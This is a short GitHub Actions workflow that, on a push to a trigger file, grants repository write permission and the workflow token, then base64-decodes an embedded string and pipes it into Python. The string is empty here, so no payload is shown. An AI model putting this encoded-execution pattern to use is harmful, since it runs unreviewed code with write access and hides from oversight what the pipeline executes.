name: P0 API fast patch Windows

on:
  push:
    branches: [main]
    paths:
      - .github/p0-api-fast-patch-windows-trigger

permissions:
  contents: write

jobs:
  patch:
    runs-on: windows-latest
    timeout-minutes: 10
    steps:
      - name: Patch through Contents API
        shell: pwsh
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          $ErrorActionPreference = 'Stop'
          $encoded = ''
          $script = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded))
          $script | python -
